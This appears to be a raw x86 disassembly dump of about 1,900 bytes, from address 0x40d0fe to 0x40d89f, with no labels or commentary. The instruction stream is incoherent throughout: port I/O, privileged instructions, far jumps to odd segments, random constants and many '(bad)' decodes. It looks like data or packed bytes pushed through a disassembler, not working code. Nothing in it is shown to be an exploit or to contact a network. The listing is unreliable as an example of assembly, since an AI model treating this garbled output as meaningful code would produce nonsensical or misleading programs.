  40d0fe:	mov    BYTE PTR [ebp+0x20],0xfe
  40d102:	push   ebp
  40d103:	inc    edi
  40d104:	cwde   
  40d105:	or     dh,ah
  40d107:	cwde   
  40d108:	popa   
  40d109:	cmp    edx,edx
  40d10b:	iret   
  40d10c:	stos   BYTE PTR es:[edi],al
  40d10d:	or     DWORD PTR [eax-0x79],eax
  40d110:	dec    esi
  40d111:	sbb    edx,edi
  40d113:	xor    ebp,DWORD PTR ds:0x2e25
  40d118:	mov    edx,0x669e7b04
  40d11d:	xchg   ebx,eax
  40d11e:	test   al,0x72
  40d120:	rcr    BYTE PTR [ecx+0x433f729],0xbf
  40d127:	cmc    
  40d128:	ja     0x40d15b
  40d12a:	repz pushf 
  40d12c:	shl    DWORD PTR [edi],0x9f
  40d12f:	inc    esp
  40d130:	xor    eax,0x2c8e0ef6
  40d135:	jmp    0xdadf3e5c
  40d13a:	imul   esi,ebp,0xfffffff1
  40d13d:	inc    eax
  40d13e:	inc    edx
  40d13f:	(bad)  
  40d140:	cmp    al,0xe2
  40d142:	or     esp,DWORD PTR [eax-0xf77266b]
  40d148:	fcom   QWORD PTR [edi]
  40d14a:	pop    ecx
  40d14b:	dec    ecx
  40d14c:	push   0xb323a173
  40d151:	cmp    al,0x2f
  40d153:	fstp   DWORD PTR [esi+edx*2-0x38]
  40d157:	mov    cl,0xd8
  40d159:	push   esp
  40d15a:	bnd jnp 0x40d1c1
  40d15d:	mov    eax,0xc2a46eae
  40d162:	sahf   
  40d163:	aaa    
  40d164:	scas   al,BYTE PTR es:[edi]
  40d165:	xchg   esp,eax
  40d166:	ja     0x40d1b1
  40d168:	dec    edx
  40d169:	retf   
  40d16a:	fist   WORD PTR [edx]
  40d16c:	pop    ss
  40d16d:	sub    DWORD PTR [ecx],0xffffffe4
  40d170:	dec    DWORD PTR [ecx]
  40d172:	inc    eax
  40d173:	add    BYTE PTR [ecx],dh
  40d175:	or     BYTE PTR [ebx-0x54],dl
  40d178:	and    eax,0x228b0c23
  40d17d:	sub    ah,bh
  40d17f:	dec    ebx
  40d180:	neg    DWORD PTR [edi+0x265a83e8]
  40d186:	ficomp DWORD PTR [edi+0x6e]
  40d189:	cmp    eax,0x1e9d4ca7
  40d18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d18f:	push   edx
  40d190:	cmp    eax,0xcaf0a70b
  40d195:	loop   0x40d1b8
  40d197:	not    ebp
  40d199:	je     0x40d1e4
  40d19b:	mov    al,0xf8
  40d19d:	pop    esi
  40d19e:	dec    eax
  40d19f:	or     eax,0xd80201c9
  40d1a4:	sar    DWORD PTR [esi],0x23
  40d1a7:	pushf  
  40d1a8:	popa   
  40d1a9:	pop    es
  40d1aa:	adc    eax,0x12e4e6dd
  40d1af:	dec    edx
  40d1b0:	int3   
  40d1b1:	inc    esi
  40d1b2:	(bad)  
  40d1b3:	outs   dx,BYTE PTR ds:[esi]
  40d1b4:	stos   DWORD PTR es:[edi],eax
  40d1b5:	inc    ecx
  40d1b6:	cmp    DWORD PTR [ebp+0x73],esp
  40d1b9:	pop    ss
  40d1ba:	sbb    dl,al
  40d1bc:	test   al,0x43
  40d1be:	or     al,0x54
  40d1c0:	pop    edx
  40d1c1:	ins    BYTE PTR es:[edi],dx
  40d1c2:	push   esp
  40d1c3:	sub    edx,ecx
  40d1c5:	bound  esi,QWORD PTR [edx+0x4ecfb31a]
  40d1cb:	jecxz  0x40d165
  40d1cd:	sti    
  40d1ce:	push   0xfffffff4
  40d1d0:	fadd   QWORD PTR [edi-0x11]
  40d1d3:	push   cs
  40d1d4:	push   edi
  40d1d5:	adc    BYTE PTR [edx+0x1f7e047],ah
  40d1db:	(bad)
  40d1de:	mov    eax,0x276bc964
  40d1e3:	push   ebx
  40d1e4:	out    0x12,eax
  40d1e6:	daa    
  40d1e7:	mov    ss,WORD PTR [edx]
  40d1e9:	and    ebp,edx
  40d1eb:	imul   edi,eax,0x1f
  40d1ee:	mov    edi,0x8d0b2182
  40d1f3:	sub    ah,BYTE PTR [ecx]
  40d1f5:	pop    ss
  40d1f6:	cmp    DWORD PTR [ebp-0x76],ecx
  40d1f9:	addr16 das 
  40d1fb:	mov    bh,0x3b
  40d1fd:	mov    ds:0x166030b2,al
  40d202:	ret    
  40d203:	mov    bh,0x24
  40d205:	mov    ebx,0x66d19bdf
  40d20a:	jmp    0x40d1cc
  40d20c:	pop    ecx
  40d20d:	xor    ecx,DWORD PTR [ebp-0x4b]
  40d210:	ret    
  40d211:	adc    esp,DWORD PTR [esi+esi*8+0x2b]
  40d215:	loopne 0x40d220
  40d217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d218:	test   eax,0x3dd786
  40d21d:	mov    eax,0x53a49ae0
  40d222:	out    0x4f,eax
  40d224:	ret    
  40d225:	cmp    al,0x1
  40d227:	out    0xf9,al
  40d229:	cmp    BYTE PTR [eax+0x6ed25ca4],bh
  40d22f:	lods   eax,DWORD PTR ds:[esi]
  40d230:	adc    BYTE PTR [esi-0x6747535c],bh
  40d236:	mov    gs,WORD PTR cs:[ebp-0x36]
  40d23a:	sti    
  40d23b:	sub    al,0x38
  40d23d:	ds jmp 0x40d27f
  40d240:	aas    
  40d241:	push   esp
  40d242:	jno    0x40d219
  40d244:	fwait
  40d245:	mov    BYTE PTR [ecx],ah
  40d247:	fs mov cl,0x57
  40d24a:	cmp    dl,dl
  40d24c:	dec    ebx
  40d24d:	ss cli 
  40d24f:	push   ecx
  40d250:	test   eax,0xd5c38f40
  40d255:	cmp    ecx,ecx
  40d257:	repnz repz add BYTE PTR [eax-0x4e],al
  40d25c:	dec    edi
  40d25d:	rcl    DWORD PTR [edx+0x20],1
  40d260:	lds    esp,FWORD PTR [esi]
  40d262:	inc    edx
  40d263:	imul   ebp,DWORD PTR ds:[edx],0x275ff32
  40d26a:	xor    DWORD PTR [esi+0x31251f7],edi
  40d270:	fistp  WORD PTR [esi+0x744a551c]
  40d276:	icebp  
  40d277:	ss pop ebp
  40d279:	lock adc eax,0x687d71b6
  40d27f:	mov    eax,0x8ae2b765
  40d284:	(bad)  
  40d285:	jmp    0xdb2a2a89
  40d28a:	stos   DWORD PTR es:[edi],eax
  40d28b:	xor    al,0x64
  40d28d:	sbb    bl,0x8d
  40d290:	inc    edx
  40d291:	pop    es
  40d292:	test   al,0x10
  40d294:	(bad)  
  40d295:	add    BYTE PTR [edi],dh
  40d297:	sahf   
  40d298:	das    
  40d299:	outs   dx,BYTE PTR ds:[esi]
  40d29a:	push   esi
  40d29b:	and    eax,0x922f3ed4
  40d2a0:	outs   dx,DWORD PTR ds:[esi]
  40d2a1:	add    BYTE PTR [edi+0x71fd433f],0x8f
  40d2a8:	and    DWORD PTR [ecx+0x3b6cd07a],0xeef94052
  40d2b2:	xchg   ebp,eax
  40d2b3:	lods   al,BYTE PTR ds:[esi]
  40d2b4:	fcmovnu st,st(0)
  40d2b6:	(bad)  
  40d2b7:	cwde   
  40d2b8:	mov    ah,0x34
  40d2ba:	repnz iret 
  40d2bc:	jl     0x40d30e
  40d2be:	dec    ecx
  40d2bf:	pop    esp
  40d2c0:	stc    
  40d2c1:	add    al,0x2b
  40d2c3:	inc    esp
  40d2c4:	stc    
  40d2c5:	ins    BYTE PTR es:[edi],dx
  40d2c6:	inc    esi
  40d2c7:	sbb    cl,BYTE PTR [edx+0x6c]
  40d2ca:	fdivp  st(1),st
  40d2cc:	mov    fs,WORD PTR [edi+0x13]
  40d2cf:	jne    0x40d2fd
  40d2d1:	or     BYTE PTR [esi+0x38],dh
  40d2d4:	push   cs
  40d2d5:	xor    al,0x48
  40d2d7:	dec    eax
  40d2d8:	mov    edi,0x6dc7e139
  40d2dd:	jne    0x40d2c7
  40d2df:	ins    BYTE PTR es:[edi],dx
  40d2e0:	or     BYTE PTR [edi],dh
  40d2e2:	neg    ebx
  40d2e4:	stos   BYTE PTR es:[edi],al
  40d2e5:	jle    0x40d2d8
  40d2e7:	dec    edx
  40d2e8:	push   es
  40d2e9:	xor    DWORD PTR [edi],0x20b37c1e
  40d2ef:	mov    ebx,0x4131a8d6
  40d2f4:	outs   dx,DWORD PTR ds:[esi]
  40d2f5:	or     ebx,DWORD PTR [ecx+esi*8-0x7c59d41]
  40d2fc:	xor    dh,ah
  40d2fe:	stos   DWORD PTR es:[edi],eax
  40d2ff:	out    dx,eax
  40d300:	(bad)  
  40d301:	jge    0x40d29e
  40d303:	icebp  
  40d304:	sbb    ebx,DWORD PTR [ebx+0x50]
  40d307:	jno    0x40d319
  40d309:	jecxz  0x40d372
  40d30b:	cmc    
  40d30c:	cmp    bh,bl
  40d30e:	mov    ds:0xd0613003,al
  40d313:	mov    ebp,0x98f7c91
  40d318:	mov    ds:0x135a74c2,eax
  40d31d:	dec    ecx
  40d31e:	sub    eax,0xc16b6a11
  40d323:	gs aad 0xac
  40d326:	test   eax,0x6c733311
  40d32b:	jmp    0x5e5a9c55
  40d330:	or     eax,0xa374eabe
  40d335:	popf   
  40d336:	out    dx,al
  40d337:	push   ebp
  40d338:	ds das 
  40d33a:	icebp  
  40d33b:	mov    ecx,es
  40d33d:	cmp    edx,ebp
  40d33f:	in     eax,0x42
  40d341:	push   ss
  40d342:	mov    ah,0xe7
  40d344:	sbb    al,cl
  40d346:	lea    esi,[ebx]
  40d348:	xchg   esi,eax
  40d349:	xor    DWORD PTR [ebx],edi
  40d34b:	pop    edi
  40d34c:	mov    edx,0x2ba816f0
  40d351:	or     DWORD PTR [edx],esi
  40d353:	imul   esp,DWORD PTR [ebp-0x18],0x76
  40d357:	jg     0x40d2f9
  40d359:	clc    
  40d35a:	jb     0x40d38b
  40d35c:	mov    eax,ds:0x880f43be
  40d361:	or     eax,edx
  40d363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d364:	mov    dh,0xb1
  40d366:	cwde   
  40d367:	mov    esp,DWORD PTR [bx+di+0x2bae]
  40d36c:	inc    edx
  40d36d:	mov    dh,0xf3
  40d36f:	xor    bl,0xa3
  40d372:	(bad)  
  40d373:	xor    eax,DWORD PTR [edx]
  40d375:	mov    WORD PTR [edx],?
  40d377:	mov    ds:0x2a7707ca,al
  40d37c:	or     eax,0x6529dab7
  40d381:	test   BYTE PTR ds:[ebp-0x7e41fe22],0x68
  40d389:	loopne 0x40d3d8
  40d38b:	es in  al,dx
  40d38d:	adc    DWORD PTR [edx],edi
  40d38f:	aam    0x29
  40d391:	pop    es
  40d392:	push   0x3c9347e6
  40d397:	stc    
  40d398:	push   eax
  40d399:	and    BYTE PTR [eax-0x73d60bdf],ch
  40d39f:	mov    BYTE PTR [edi+ebp*1-0x5e0d5226],bh
  40d3a6:	ds ds je 0x40d350
  40d3aa:	paddq  mm3,mm2
  40d3ad:	mov    esi,0xe4ef8b45
  40d3b2:	(bad)  
  40d3b3:	outs   dx,BYTE PTR ds:[esi]
  40d3b4:	mov    ebp,0xa78cd2e5
  40d3b9:	mov    eax,0xa31473e2
  40d3be:	mov    bl,BYTE PTR [eax+0x2dd5ab93]
  40d3c4:	push   0xffffffad
  40d3c6:	add    DWORD PTR [eax-0x6e9993ca],esp
  40d3cc:	cli    
  40d3cd:	(bad)  
  40d3ce:	dec    eax
  40d3cf:	out    dx,al
  40d3d0:	mov    edi,0xd7d48f80
  40d3d5:	sub    ecx,ebp
  40d3d7:	hlt    
  40d3d8:	xchg   esp,eax
  40d3d9:	cli    
  40d3da:	cmp    eax,0xfc22af6a
  40d3df:	push   esi
  40d3e0:	mov    ch,0x5c
  40d3e2:	inc    ebp
  40d3e3:	sbb    al,0x5f
  40d3e5:	pop    ss
  40d3e6:	addr16 shl bl,0x4d
  40d3ea:	ins    BYTE PTR es:[edi],dx
  40d3eb:	or     al,BYTE PTR ds:0x6f8457c9
  40d3f1:	xor    DWORD PTR [edx+0x563f2876],edi
  40d3f7:	xchg   esi,eax
  40d3f8:	cmp    al,0xef
  40d3fa:	xor    al,BYTE PTR [eax+esi*1]
  40d3fd:	or     ecx,edi
  40d3ff:	dec    ecx
  40d400:	mov    al,ds:0x95622bed
  40d405:	dec    edi
  40d406:	jb     0x40d389
  40d408:	mov    BYTE PTR [edx+0x32],dh
  40d40b:	imul   ebp,DWORD PTR [edi-0x7f],0x4563d6e
  40d412:	xchg   edx,eax
  40d413:	(bad)
  40d416:	push   ecx
  40d417:	fs cmp esi,edi
  40d41a:	adc    esi,ecx
  40d41c:	push   edx
  40d41d:	sbb    DWORD PTR [ebp-0x3b],esp
  40d420:	es nop
  40d422:	js     0x40d440
  40d424:	lds    esp,FWORD PTR [eax+0x6c]
  40d427:	pop    esp
  40d428:	inc    edi
  40d429:	adc    ebp,DWORD PTR [edx-0x1cdbe085]
  40d42f:	dec    ebx
  40d430:	add    DWORD PTR [edx+0x59],edi
  40d433:	pop    edx
  40d434:	(bad)  
  40d435:	js     0x40d3e4
  40d437:	rol    BYTE PTR [esi+edx*2-0x4],cl
  40d43b:	xor    eax,0x6f400015
  40d440:	sbb    BYTE PTR [eax+ecx*4-0x799ac8d1],al
  40d447:	dec    ebx
  40d448:	xchg   ecx,eax
  40d449:	jmp    0x40d48d
  40d44b:	push   ebx
  40d44c:	(bad)  
  40d44d:	sub    dl,BYTE PTR [esi+0x1]
  40d450:	pop    ds
  40d451:	and    DWORD PTR [esp+esi*8],ecx
  40d454:	push   0x95b43520
  40d459:	in     al,dx
  40d45a:	mov    ebp,gs
  40d45c:	das    
  40d45d:	mov    dh,0xa9
  40d45f:	pusha  
  40d460:	in     eax,0xf1
  40d462:	inc    edi
  40d463:	mov    esp,0x4b2495e8
  40d468:	inc    esi
  40d469:	inc    edi
  40d46a:	sbb    DWORD PTR [esi-0x3bc663f8],edi
  40d470:	(bad)  
  40d471:	mov    edi,0x41feb9d8
  40d476:	adc    DWORD PTR [ecx+0x7],0x753ffd4f
  40d47d:	xchg   ebp,eax
  40d47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d47f:	jo     0x40d402
  40d481:	ret    0xabfa
  40d484:	push   0x5f4cd981
  40d489:	test   ebp,esp
  40d48b:	push   ecx
  40d48c:	lods   eax,DWORD PTR ds:[esi]
  40d48d:	push   0x2f
  40d48f:	dec    esp
  40d490:	outs   dx,DWORD PTR ds:[esi]
  40d491:	jl     0x40d456
  40d493:	fistp  WORD PTR [ebx]
  40d495:	xchg   ebp,eax
  40d496:	repz test bl,0xbd
  40d49a:	mov    ebp,0xaa52cf69
  40d49f:	jno    0x40d424
  40d4a1:	adc    ebp,DWORD PTR [edx+0x2c]
  40d4a4:	daa    
  40d4a5:	mov    eax,ds:0x750133df
  40d4aa:	jb     0x40d44f
  40d4ac:	mov    cl,bh
  40d4ae:	adc    eax,0x81210d5a
  40d4b3:	jl     0x40d529
  40d4b5:	ret    0x631a
  40d4b8:	inc    ebp
  40d4b9:	lods   eax,DWORD PTR ds:[esi]
  40d4ba:	jno    0x40d463
  40d4bc:	(bad)  
  40d4be:	and    al,0x30
  40d4c0:	icebp  
  40d4c1:	data16 mov dl,0x70
  40d4c4:	push   ss
  40d4c5:	in     al,dx
  40d4c6:	sti    
  40d4c7:	out    0x8d,al
  40d4c9:	jb     0x40d492
  40d4cb:	test   DWORD PTR [eax-0x7f],ebp
  40d4ce:	or     BYTE PTR [edx],ch
  40d4d0:	add    DWORD PTR [eax],edx
  40d4d2:	jecxz  0x40d508
  40d4d4:	lods   eax,DWORD PTR ds:[esi]
  40d4d5:	mov    cl,0x9c
  40d4d7:	mov    bl,0xbc
  40d4d9:	cmp    al,BYTE PTR [edx-0x4c5f73e4]
  40d4df:	sbb    bl,BYTE PTR [ecx+0x7469854d]
  40d4e5:	or     dl,dl
  40d4e7:	lds    esi,FWORD PTR [ebp+0x29]
  40d4ea:	cmp    ebp,DWORD PTR [eax+0x68]
  40d4ed:	add    eax,0x4fcb61f5
  40d4f2:	xchg   ecx,eax
  40d4f3:	fwait
  40d4f4:	not    eax
  40d4f6:	jl     0x40d53b
  40d4f8:	push   esi
  40d4f9:	push   eax
  40d4fa:	sbb    ah,dl
  40d4fc:	add    eax,0x9ea43ed6
  40d501:	mov    DWORD PTR [ecx+0x39d56b19],ebp
  40d507:	sahf   
  40d508:	push   ds
  40d509:	in     eax,0x16
  40d50b:	pop    ss
  40d50c:	xchg   edx,esp
  40d50e:	jl     0x40d574
  40d510:	stc    
  40d511:	xor    BYTE PTR [esi+ebx*1-0x527e2ff5],dh
  40d518:	pop    edi
  40d519:	in     al,0xcd
  40d51b:	sahf   
  40d51c:	push   0x82d2bbbf
  40d521:	shr    DWORD PTR [ecx+0x15],cl
  40d524:	fdiv   DWORD PTR ds:0xf3299ec9
  40d52a:	add    al,0x8d
  40d52c:	sti    
  40d52d:	or     al,BYTE PTR [ebp-0x13]
  40d530:	mov    ds:0x47383712,eax
  40d535:	sar    ecx,1
  40d537:	dec    esp
  40d538:	data16 cmp bh,BYTE PTR [ebp+0x5b728646]
  40d53f:	popaw  
  40d541:	and    eax,0xe4fd194c
  40d546:	mov    esi,esi
  40d548:	inc    edi
  40d549:	xor    DWORD PTR [esi-0x5a371781],edi
  40d54f:	sbb    edx,DWORD PTR [edx+0x48]
  40d552:	mov    ?,WORD PTR ds:0xbad16960
  40d558:	into   
  40d559:	shl    ebp,0x2a
  40d55c:	jb     0x40d5dc
  40d55e:	xor    eax,0xda2cf72
  40d563:	mov    eax,ds:0x15695ea4
  40d568:	test   ebp,0x57deb9fd
  40d56e:	add    cl,BYTE PTR [eax-0xd2e07a4]
  40d574:	cmp    eax,0xa2563c6e
  40d579:	mov    al,ds:0x5e6a31bb
  40d57e:	xchg   esi,ecx
  40d580:	push   es
  40d581:	sbb    ebp,ecx
  40d583:	std    
  40d584:	sub    bh,cl
  40d586:	gs repnz enter 0x39f5,0xc6
  40d58c:	popa   
  40d58d:	adc    edx,ecx
  40d58f:	out    dx,al
  40d590:	scas   eax,DWORD PTR es:[edi]
  40d591:	imul   eax,eax,0x1031ae86
  40d597:	ror    DWORD PTR [edi+0x5e],cl
  40d59a:	and    BYTE PTR [di+0x5364],dl
  40d59f:	inc    eax
  40d5a0:	(bad)  
  40d5a1:	scas   eax,DWORD PTR es:[edi]
  40d5a2:	push   0xc9800347
  40d5a7:	mov    fs,WORD PTR [edi+ebx*2-0x21]
  40d5ab:	inc    edi
  40d5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5ad:	adc    al,dh
  40d5af:	je     0x40d5bd
  40d5b1:	es dec esi
  40d5b3:	ja     0x40d540
  40d5b5:	mov    WORD PTR [ecx],gs
  40d5b7:	lock (bad) 
  40d5b9:	push   esp
  40d5ba:	mov    edx,0x8030a4d2
  40d5bf:	mov    ecx,0x9557c0ff
  40d5c4:	fistp  QWORD PTR [esi]
  40d5c6:	jg     0x40d609
  40d5c8:	ja     0x40d59f
  40d5ca:	repnz leave 
  40d5cc:	outs   dx,BYTE PTR ds:[esi]
  40d5cd:	fwait
  40d5ce:	push   0x9dc5df75
  40d5d3:	mul    DWORD PTR [edi-0x3b42a8e5]
  40d5d9:	mov    edx,0x8a679867
  40d5de:	ret    0x753c
  40d5e1:	lods   eax,DWORD PTR ds:[esi]
  40d5e2:	mov    ah,0x11
  40d5e4:	int3   
  40d5e5:	push   es
  40d5e6:	dec    edx
  40d5e7:	ror    al,0xba
  40d5ea:	jg     0x40d5e6
  40d5ec:	mov    ebp,0x87082365
  40d5f1:	xor    eax,0x49e01fd5
  40d5f6:	mov    ds:0xdd162532,eax
  40d5fb:	mov    ecx,0xd55789b7
  40d600:	xchg   BYTE PTR [eax-0x6503d8f2],cl
  40d606:	adc    esp,edi
  40d608:	std    
  40d609:	and    DWORD PTR ds:0x3f749bd5,esi
  40d60f:	(bad)  
  40d610:	mov    ds:0x637ad205,al
  40d615:	or     eax,0xf51441e
  40d61a:	loopne 0x40d668
  40d61c:	aas    
  40d61d:	imul   esi,DWORD PTR [ebx+0x1b],0x57d765d6
  40d624:	cli    
  40d625:	push   cs
  40d626:	scas   al,BYTE PTR es:[edi]
  40d627:	push   ebp
  40d628:	and    dh,BYTE PTR [edx-0x3e]
  40d62b:	pusha  
  40d62c:	imul   edx,DWORD PTR [ebx+0x7d],0xffffffaa
  40d630:	xchg   esi,eax
  40d631:	mov    ch,0xee
  40d633:	fistp  WORD PTR [ecx]
  40d635:	adc    BYTE PTR [edx-0x52702cdf],bl
  40d63b:	sub    al,ah
  40d63d:	pop    eax
  40d63e:	add    DWORD PTR [eax-0x6b0b2351],ebx
  40d644:	sti    
  40d645:	mov    al,0x37
  40d647:	cmp    eax,0x70d42116
  40d64c:	dec    ecx
  40d64d:	mov    ah,0x4b
  40d64f:	imul   edi
  40d651:	(bad)  [ebx-0x672f62d7]
  40d657:	mov    bl,0x1d
  40d659:	test   DWORD PTR [ebx-0x20],edx
  40d65c:	ja     0x40d676
  40d65e:	push   es
  40d65f:	sbb    ch,BYTE PTR ds:0x8ee5c738
  40d665:	out    0xe1,eax
  40d667:	lock repnz (bad) 
  40d66a:	mov    cs,WORD PTR [esi]
  40d66c:	push   eax
  40d66d:	jmp    FWORD PTR [eax+0x2c]
  40d670:	(bad)  
  40d672:	scas   al,BYTE PTR es:[edi]
  40d673:	rol    DWORD PTR [esi],1
  40d675:	push   eax
  40d676:	push   ss
  40d677:	or     BYTE PTR [esi+0x151bb578],dl
  40d67d:	test   bh,ch
  40d67f:	fcomp  st(5)
  40d681:	sub    eax,0xe89eb70d
  40d686:	inc    ecx
  40d687:	rcl    cl,1
  40d689:	clc    
  40d68a:	std    
  40d68b:	push   cs
  40d68c:	stc    
  40d68d:	mov    DWORD PTR [ecx-0x22],eax
  40d690:	dec    ecx
  40d691:	out    0x4e,al
  40d693:	ret    0x94c2
  40d696:	sub    al,0xa9
  40d698:	aad    0x17
  40d69a:	xchg   edx,eax
  40d69b:	or     al,0x92
  40d69d:	sbb    eax,0x71cc187e
  40d6a2:	aad    0xad
  40d6a4:	or     eax,0x532bdbc7
  40d6a9:	out    0xce,eax
  40d6ab:	sub    al,BYTE PTR [ebx+ecx*8-0x1f9dd2ea]
  40d6b2:	cmp    BYTE PTR [edi],dh
  40d6b4:	pusha  
  40d6b5:	push   0xfed9e4
  40d6ba:	(bad)  
  40d6bb:	cmc    
  40d6bc:	enter  0x56cf,0x97
  40d6c0:	push   ebp
  40d6c1:	jp     0x40d668
  40d6c3:	pop    DWORD PTR [ebp-0x6de85a9c]
  40d6c9:	loope  0x40d712
  40d6cb:	sub    dh,al
  40d6cd:	jl     0x40d6ee
  40d6cf:	pop    ecx
  40d6d0:	cmp    edi,DWORD PTR [edi+edi*4-0x5d28fc21]
  40d6d7:	mov    ebp,0xfad03cf2
  40d6dc:	push   edi
  40d6dd:	aad    0x3f
  40d6df:	imul   eax,eax,0x71
  40d6e2:	shl    BYTE PTR [esp+eiz*4+0x73],1
  40d6e6:	cld    
  40d6e7:	(bad)
  40d6ea:	sahf   
  40d6eb:	mov    ebp,0x80b612dc
  40d6f0:	das    
  40d6f1:	xchg   BYTE PTR [ebx],dh
  40d6f3:	lods   eax,DWORD PTR ds:[esi]
  40d6f4:	addr16 dec esi
  40d6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6f7:	(bad)  
  40d6f8:	mov    ah,0x85
  40d6fa:	scas   al,BYTE PTR es:[edi]
  40d6fb:	data16 and BYTE PTR [ebp+0x4367d7ed],ch
  40d702:	add    eax,0x5feb25b8
  40d707:	adc    edx,0x3bb92db4
  40d70d:	or     eax,0xe22947c1
  40d712:	retf   0x8186
  40d715:	inc    edx
  40d716:	and    esi,DWORD PTR [edx-0x54b7a2eb]
  40d71c:	(bad)
  40d71f:	ret    
  40d720:	xchg   dl,cl
  40d722:	xchg   edi,eax
  40d723:	jmp    0x6d4:0x89040bba
  40d72a:	cs inc ebp
  40d72c:	aam    0xec
  40d72e:	ds retf 
  40d730:	push   ax
  40d732:	mov    esp,0x2cd656c1
  40d737:	push   eax
  40d738:	xchg   BYTE PTR [edx],bl
  40d73a:	or     DWORD PTR [edi],edi
  40d73c:	xor    BYTE PTR [edi],bl
  40d73e:	add    DWORD PTR [ecx-0x35],ebp
  40d741:	pop    edx
  40d742:	imul   eax,DWORD PTR [eax-0x53],0x3f
  40d746:	mov    al,ds:0xfb5bb764
  40d74b:	scas   eax,DWORD PTR es:[edi]
  40d74c:	push   eax
  40d74d:	(bad)  
  40d74e:	mov    ebx,0x3b97126f
  40d753:	sahf   
  40d754:	ins    DWORD PTR es:[edi],dx
  40d755:	test   eax,0x3cdfc74b
  40d75a:	mov    eax,ds:0x9b78ac90
  40d75f:	je     0x40d6f0
  40d761:	push   ebx
  40d762:	pop    eax
  40d763:	and    dh,0x42
  40d766:	xchg   ebx,eax
  40d767:	and    eax,DWORD PTR [ecx]
  40d769:	outs   dx,DWORD PTR ds:[esi]
  40d76a:	std    
  40d76b:	mov    WORD PTR [ecx-0x6f],ds
  40d76e:	pushf  
  40d76f:	dec    esi
  40d770:	or     eax,0x669cbbff
  40d775:	stos   DWORD PTR es:[edi],eax
  40d776:	shr    ah,cl
  40d778:	(bad)  
  40d77a:	les    eax,FWORD PTR [esi]
  40d77c:	loopne 0x40d742
  40d77e:	mov    BYTE PTR [esi],ch
  40d780:	ret    0xce44
  40d783:	in     al,0x75
  40d785:	mov    eax,ds:0xedfade4d
  40d78a:	fcomp  QWORD PTR [eax+0x4b76d44d]
  40d790:	pop    ss
  40d791:	xchg   ebp,eax
  40d792:	push   ss
  40d793:	adc    BYTE PTR [esi+0x5a0773ed],dl
  40d799:	cmp    al,bl
  40d79b:	(bad)  
  40d79c:	and    ebx,DWORD PTR [eax+eax*4+0x5bcde0c9]
  40d7a3:	pop    ds
  40d7a4:	xor    BYTE PTR cs:[ebx+0x3b06e179],cl
  40d7ab:	sub    eax,0x98fc951e
  40d7b0:	(bad)  
  40d7b1:	ins    WORD PTR es:[edi],dx
  40d7b3:	jle    0x40d81a
  40d7b5:	xor    edx,DWORD PTR [ebx+0x1]
  40d7b8:	sbb    BYTE PTR [esi-0x6a],al
  40d7bb:	adc    DWORD PTR [edx+0x56d4b225],edx
  40d7c1:	add    edi,DWORD PTR ds:0xf8d12a74
  40d7c7:	gs mov edx,ds
  40d7ca:	ret    
  40d7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7cc:	(bad)  
  40d7cd:	adc    BYTE PTR ds:0x1c06b5a1,bh
  40d7d3:	mov    ecx,0xe543f257
  40d7d8:	pop    ebx
  40d7d9:	add    BYTE PTR [esp+edi*2-0x1c],ch
  40d7dd:	inc    ecx
  40d7de:	cld    
  40d7df:	xor    bh,bl
  40d7e1:	push   ebp
  40d7e2:	stos   DWORD PTR es:[edi],eax
  40d7e3:	fcomp  QWORD PTR [eax]
  40d7e5:	ja     0x40d858
  40d7e7:	cmp    BYTE PTR [edx+0x7b],cl
  40d7ea:	jle    0x40d843
  40d7ec:	or     BYTE PTR [ebx+0x1dad290c],cl
  40d7f2:	loop   0x40d7f9
  40d7f4:	mov    ch,0x96
  40d7f6:	lods   al,BYTE PTR ds:[esi]
  40d7f7:	sbb    al,0xae
  40d7f9:	sbb    eax,0xaba8a140
  40d7fe:	mov    dl,0x3
  40d800:	out    dx,al
  40d801:	mov    edi,esp
  40d803:	inc    ebp
  40d804:	xor    esi,DWORD PTR [ebx+0x1e636d2a]
  40d80a:	mov    ecx,0xb6035713
  40d80f:	ret    
  40d810:	cld    
  40d811:	shl    esi,cl
  40d813:	or     eax,0xf0507fa6
  40d818:	and    bh,BYTE PTR [esi+edx*2]
  40d81b:	sbb    ebp,DWORD PTR [edi-0x2277bd71]
  40d821:	out    0x5f,al
  40d823:	dec    ecx
  40d824:	adc    dh,BYTE PTR [esi]
  40d826:	int3   
  40d827:	xchg   esp,eax
  40d828:	dec    edi
  40d829:	inc    ebx
  40d82a:	pusha  
  40d82b:	mov    dl,0xf5
  40d82d:	xor    bl,ah
  40d82f:	test   al,0x3b
  40d831:	ds jb  0x40d803
  40d834:	dec    ecx
  40d835:	bound  ecx,QWORD PTR [ecx]
  40d837:	sub    dl,BYTE PTR [ebx]
  40d839:	jmp    0xc2902e6
  40d83e:	jecxz  0x40d8be
  40d840:	jmp    0x4051:0x9a92ba82
  40d847:	jb     0x40d80f
  40d849:	push   bx
  40d84b:	lods   al,BYTE PTR ds:[esi]
  40d84c:	and    al,0x10
  40d84e:	dec    eax
  40d850:	hlt    
  40d851:	adc    ebx,DWORD PTR [esi+eiz*2+0xf]
  40d855:	adc    al,0x9e
  40d857:	adc    dh,BYTE PTR [ebx+0x78]
  40d85a:	mov    BYTE PTR ds:[eax-0x5f4f79ba],bl
  40d861:	sahf   
  40d862:	jbe    0x40d8c8
  40d864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d865:	mov    cl,0xc9
  40d867:	(bad)  
  40d869:	add    al,0xef
  40d86b:	adc    bl,BYTE PTR [ecx+edi*2+0x5bce008e]
  40d872:	inc    edx
  40d873:	fld    TBYTE PTR ds:0x3059e157
  40d879:	aaa    
  40d87a:	retf   
  40d87b:	out    0xa4,al
  40d87d:	outs   dx,BYTE PTR ds:[esi]
  40d87e:	in     eax,0x35
  40d880:	leave  
  40d881:	xchg   ebp,eax
  40d882:	icebp  
  40d883:	cs jp  0x40d85c
  40d886:	jns    0x40d81c
  40d888:	call   0x9df9:0x405d3222
  40d88f:	adc    al,0xdd
  40d891:	lock int3 
  40d893:	and    BYTE PTR ds:[edi],ch
  40d896:	scas   eax,DWORD PTR es:[edi]
  40d897:	repz aam 0xb5
  40d89a:	mov    al,ds:0xd4a1d5
  40d89f:	sub    BYTE PTR [esi+0x5ce7821d],al
